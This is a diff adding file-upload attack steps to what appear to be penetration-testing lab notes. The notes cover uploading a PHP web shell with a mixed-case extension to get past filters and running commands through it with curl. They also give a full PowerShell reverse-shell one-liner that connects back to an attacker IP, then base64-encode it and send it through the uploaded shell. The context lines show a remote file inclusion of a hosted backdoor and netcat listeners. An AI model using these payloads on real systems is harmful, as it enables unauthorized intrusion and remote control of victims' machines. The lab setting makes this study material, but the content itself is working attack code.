@@ -189,3 +189,20 @@ quick note: windows path traversal: ```curl --path-as-is http://192.168.205.193:
 - Start a webserver in the ```/usr/share/webshells/php/``` directory: ```python3 -m http.server 80```
 - Use curl to include the hosted file via HTTP and specify 'ls' as our command: ```curl "http://mountaindesserts.com/meteor/index.php?page=http://<local IP>/simple-backdoor.php&cmd=ls"```
 - Using the reverse shell, start a netcat listener on 4444: ```nc –nlvp 4444```
+
+## File Upload Vulnerabilities
+
+- Executable Files
+  - Use benign *.txt file to test for upload filtering: ```echo "this is a test" > test.txt```
+  - Upload php script like simple-backdoor.php
+  - curl it: ```curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir```
+  - Start a netcat listener: ```nc -nvlp 4444```
+  - To use the PowerShell one-liner
+    - ```pwsh```
+    - PowerShell one-liner reverse-shell:
+```
+$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+```
+  - Then encode: ```$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)``` > ```$EncodedText =[Convert]::ToBase64String($Bytes)``` > ```$EncodedText```
+  - Exit PowerShell with ```exit```
+  - Send it with curl: ```curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20<encoded>```
